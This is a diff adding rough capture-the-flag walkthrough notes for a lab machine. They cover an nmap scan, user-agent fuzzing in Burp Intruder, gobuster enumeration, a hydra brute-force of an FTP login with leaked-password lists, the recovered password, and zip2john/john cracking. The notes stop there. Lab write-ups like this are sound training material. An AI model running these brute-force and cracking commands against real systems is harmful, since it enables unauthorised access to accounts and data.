@@ -1,1 +1,84 @@
 
+1 - Recon
+
+NMAP FIRST
+
+RECON
+
+NMAP first
+
+nmap -v -A -p1-2000 -T5 10.10.250.250 -o results.txt
+
+Host is up (0.0044s latency).
+Not shown: 1971 closed ports, 26 filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (EdDSA)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Annoucement
+MAC Address: 02:A0:B8:08:FD:2B (Unknown)
+Aggressive OS guesses: Linux 3.13 (96%), Linux 3.8 (96%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 (92%), Linux 3.19 (92%), Linux 3.2 - 4.8 (92%), Linux 3.4 - 3.10 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 15.968 days (since Sun Feb 25 01:28:44 2024)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=266 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+NEXT STEPS
+
+Navigated to the http server on port 80 which had the following:
+
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R 
+
+With this in mind, we then open Burp Suite, activate proxy and capture a request.
+We send this request to Intruder and then set the User Agent to A
+We then add a POSITION to this single character with the hint we were given kept in mind (Agent R has a single letter so other agents might as well)
+After this we go to the Intruder payloads tab and enter into payload settings the characters of the alphabet individually.
+
+We then run the attack and see that the letter C has a different status code from the rest.
+
+(You could have also used user-agent switcher firefox addon)
+-------------
+
+We change User Agent to C with Burp Suite and are given access to another page with the following contents:
+
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R 
+
+
+gobuster dir -u http://10.10.250.250:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,conf,.css,.js -H "User-Agent: C"
+
+
+hydra -l chris -P /usr/share/wordlists/fasttrack.txt ftp://10.10.250.250 -t 4 
+
+-> this didnt work so we tried the short rockyou.txt version from the following github:
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-20.txt     - THIS WORKED
+
+Password for ssh = crystal
+
+
+We use zip2john 8702.zip > output.txt to make the zip file a readable file for john and we go for the hash with john.
+
+    zip2john 8702.zip > output.txt.
+    john output.txt.
+
+
